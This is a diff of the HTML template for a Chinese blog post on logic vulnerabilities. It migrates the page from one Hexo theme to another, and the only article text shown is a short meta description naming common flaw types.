@@ -1,461 +1,174 @@
-<!DOCTYPE HTML>
-<html lang="zh-CN">
 
+<!DOCTYPE html><html lang="zh-CN">
 
 <head>
-    <meta charset="utf-8">
-    <meta name="keywords" content="逻辑漏洞, hybcx&#39;s blog">
-    <meta name="description" content="浅析逻辑漏洞
-1. 漏洞介绍
-1.1 成因
-设计阶段产生，老司机也会产生、相对难发现、难以防护，相对容易利用 第三方逻辑缺陷、没有在设计初期进行安全审计、安全水平及对安全认知程度不一致
-	逻辑漏洞是指由于程序逻辑不严或逻辑太复杂，导致一些逻">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <meta name="renderer" content="webkit|ie-stand|ie-comp">
-    <meta name="mobile-web-app-capable" content="yes">
-    <meta name="format-detection" content="telephone=no">
-    <meta name="referrer" content="no-referrer-when-downgrade">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta name="referrer" content="no-referrer-when-downgrade">
-    <!-- Global site tag (gtag.js) - Google Analytics -->
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
+  
+  <meta name="generator" content="Hexo 7.2.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  
+  <title>逻辑漏洞 - hybcx's blog</title>
 
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BYTY196ENH"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
+  
+    <meta name="description" content="浅析逻辑漏洞 1. 漏洞介绍 1.1 成因 设计阶段产生，老司机也会产生、相对难发现、难以防护，相对容易利用 第三方逻辑缺陷、没有在设计初期进行安全审计、安全水平及对安全认知程度不一致 	逻辑漏洞是指由于程序逻辑不严或逻辑太复杂，导致一些逻辑分支不能够正常处理或处理错误，一般出现任意密码修改（没有旧密码验证）、越权访问、密码找回、交易支付金额等。  ​		逻辑漏洞是指攻击者利用业务&#x2F;功能上的设计缺">
+<meta property="og:type" content="article">
+<meta property="og:title" content="逻辑漏洞">
+<meta property="og:url" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/index.html">
+<meta property="og:site_name" content="hybcx&#39;s blog">
+<meta property="og:description" content="浅析逻辑漏洞 1. 漏洞介绍 1.1 成因 设计阶段产生，老司机也会产生、相对难发现、难以防护，相对容易利用 第三方逻辑缺陷、没有在设计初期进行安全审计、安全水平及对安全认知程度不一致 	逻辑漏洞是指由于程序逻辑不严或逻辑太复杂，导致一些逻辑分支不能够正常处理或处理错误，一般出现任意密码修改（没有旧密码验证）、越权访问、密码找回、交易支付金额等。  ​		逻辑漏洞是指攻击者利用业务&#x2F;功能上的设计缺">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230706213619400.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230707192616715.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230707192633721.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230707192717088.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230707195809298.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230707195907016.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230707200042178.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230707200214634.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230707200304348.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230707200358755.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230707200500204.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230707200644088.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230707200729146.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230708170804110.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230708171343041.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230708171638073.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230708172042668.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230708172514410.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230708172612714.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230708172643840.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230708180359320.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230708180414805.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230708181507793.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230708185646585.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230708185821418.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230708185915206.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230708190031855.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230708192011727.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230708192325602.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230708205319201.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230708205742734.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230708205907242.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230720085106759.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230720091018964.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230720091259221.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230720091942472.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230720092032392.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230720092457746.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230720094805950.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230720094833341.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230720094939479.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230720095004049.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230720095222105.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230720103225959.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230720103328016.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230720103346717.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230720103404726.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230720103454420.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230720103606923.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230720103812794.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230720103833229.png">
+<meta property="article:published_time" content="2023-07-29T12:11:20.670Z">
+<meta property="article:modified_time" content="2023-08-02T09:27:31.833Z">
+<meta property="article:author" content="hybcx">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/image-20230706213619400.png">
+  
+  
+  
+  
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.28.1">
+
+  
+
+  
     
-      gtag('config', 'G-BYTY196ENH');
-    </script>
+<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">
 
+  
 
-    <title>逻辑漏洞 | hybcx&#39;s blog</title>
-    <link rel="icon" type="image/png" href="/favicon.png">
-    
+  <script>
+  if (window.localStorage.getItem('ZYI_Theme_Mode')==='dark' || (window.localStorage.getItem('ZYI_Theme_Mode')==='Moss' && window.matchMedia('(prefers-color-scheme: dark)').matches)){
+      document.querySelector("html").id = "ZYDark";
+  }
+</script>
+<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/custom/css/ZYDark.css">
 
-
-    <!-- bg-cover style     -->
-
-
-
-<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
-<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
-<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
-<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
-<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
-<link rel="stylesheet" type="text/css" href="/css/matery.css">
-<link rel="stylesheet" type="text/css" href="/css/my.css">
-<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
-
-
-
-
-    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
-    <link rel="stylesheet" href="/css/post.css">
-
-
-
-
-    
-        <link rel="stylesheet" type="text/css" href="/css/reward.css">
-    
-
-
-
-    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
-
-<meta name="generator" content="Hexo 7.2.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 </head>
-
-
 <body>
-    <header class="navbar-fixed">
-    <nav id="headNav" class="bg-color nav-transparent">
-        <div id="navContainer" class="nav-wrapper container">
-            <div class="brand-logo">
-                <a href="/" class="waves-effect waves-light">
-                    
-                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
-                    
-                    <span class="logo-span diyFont">hybcx&#39;s blog</span>
-                </a>
-            </div>
-            
 
-<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
-<ul class="right nav-menu">
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/" class="waves-effect waves-light">
-      
-      <i class="fas fa-home" style="zoom: 0.6;"></i>
-      
-      <span>首页</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/tags" class="waves-effect waves-light">
-      
-      <i class="fas fa-tags" style="zoom: 0.6;"></i>
-      
-      <span>标签</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/categories" class="waves-effect waves-light">
-      
-      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
-      
-      <span>分类</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/archives" class="waves-effect waves-light">
-      
-      <i class="fas fa-archive" style="zoom: 0.6;"></i>
-      
-      <span>归档</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>关于</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/contact" class="waves-effect waves-light">
-      
-      <i class="fas fa-comments" style="zoom: 0.6;"></i>
-      
-      <span>留言板</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/friends" class="waves-effect waves-light">
-      
-      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
-      
-      <span>友情链接</span>
-    </a>
-    
-  </li>
-  
-  <li>
-    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
-      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
-    </a>
-  </li>
-  <li>
-    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
-      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
-    </a>
-  </li>
-</ul>
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
 
 
-<div id="mobile-nav" class="side-nav sidenav">
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/logo.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 奈何却无能</div></a></div></header>
 
-    <div class="mobile-head bg-color">
-        
-        <img src="/medias/logo.png" class="logo-img circle responsive-img">
-        
-        <div class="logo-name">hybcx&#39;s blog</div>
-        <div class="logo-desc">
-            
-            Never really desperate, only the lost of the soul.
-            
-        </div>
-    </div>
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
 
-    <ul class="menu-list mobile-menu-list">
-        
-        <li class="m-nav-item">
-	  
-		<a href="/" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-home"></i>
-			
-			首页
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/tags" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-tags"></i>
-			
-			标签
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/categories" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-bookmark"></i>
-			
-			分类
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/archives" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-archive"></i>
-			
-			归档
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			关于
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/contact" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-comments"></i>
-			
-			留言板
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/friends" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-address-book"></i>
-			
-			友情链接
-		</a>
-          
-        </li>
-        
-        
-        <li><div class="divider"></div></li>
-        <li>
-            <a href="https://github.com/hybchenxing/" class="waves-effect waves-light" target="_blank">
-                <i class="fab fa-github-square fa-fw"></i>Fork Me
-            </a>
-        </li>
-        
-    </ul>
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
 </div>
+<div class="widgets">
 
 
-        </div>
-
-        
-            <style>
-    .nav-transparent .github-corner {
-        display: none !important;
-    }
-
-    .github-corner {
-        position: absolute;
-        z-index: 10;
-        top: 0;
-        right: 0;
-        border: 0;
-        transform: scale(1.1);
-    }
-
-    .github-corner svg {
-        color: #0f9d58;
-        fill: #fff;
-        height: 64px;
-        width: 64px;
-    }
-
-    .github-corner:hover .octo-arm {
-        animation: a 0.56s ease-in-out;
-    }
-
-    .github-corner .octo-arm {
-        animation: none;
-    }
-
-    @keyframes a {
-        0%,
-        to {
-            transform: rotate(0);
-        }
-        20%,
-        60% {
-            transform: rotate(-25deg);
-        }
-        40%,
-        80% {
-            transform: rotate(10deg);
-        }
-    }
-</style>
-
-<a href="https://github.com/hybchenxing/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
-   data-tooltip="Fork Me" data-position="left" data-delay="50">
-    <svg viewBox="0 0 250 250" aria-hidden="true">
-        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
-        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
-              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
-        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
-              fill="currentColor" class="octo-body"></path>
-    </svg>
-</a>
-        
-    </nav>
-
-</header>
-
-    
-
-
-
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
-    <div class="container" style="right: 0px;left: 0px;">
-        <div class="row">
-            <div class="col s12 m12 l12">
-                <div class="brand">
-                    <h1 class="description center-align post-title">逻辑漏洞</h1>
-                </div>
-            </div>
-        </div>
-    </div>
+<widget class="widget-wrapper slide-up post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/04/30/hnctf-2022/"><span class="title">HNCTF2022</span></a><a class="item title" href="/2024/03/26/gdouctf-2023/"><span class="title">GDOUCTF2023</span></a><a class="item title" href="/2024/05/02/misc-shua-ti-zhi-lu/"><span class="title">MISC-刷题之旅</span></a><a class="item title" href="/2024/03/24/shell-xue-xi/"><span class="title">shell学习</span></a><a class="item title" href="/2023/08/06/qian-xi-ssti-lou-dong/"><span class="title">浅析SSTI漏洞</span></a><a class="item title" href="/2024/03/29/thm-jin-gong-xing-shen-tou-ce-shi/"><span class="title">THM-进攻性渗透测试</span></a><a class="item title" href="/2023/11/12/flask-pin-ma-xue-xi/"><span class="title">Flask-PIN码学习</span></a><a class="item title" href="/2024/04/23/php-xue-xi-zong-jie/"><span class="title">PHP学习总结</span></a><a class="item title" href="/2024/04/15/uuctf-2022/"><span class="title">UUCTF_2022</span></a><a class="item title" href="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/"><span class="title">i春秋CTF刷题</span></a></div></widget>
 </div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" 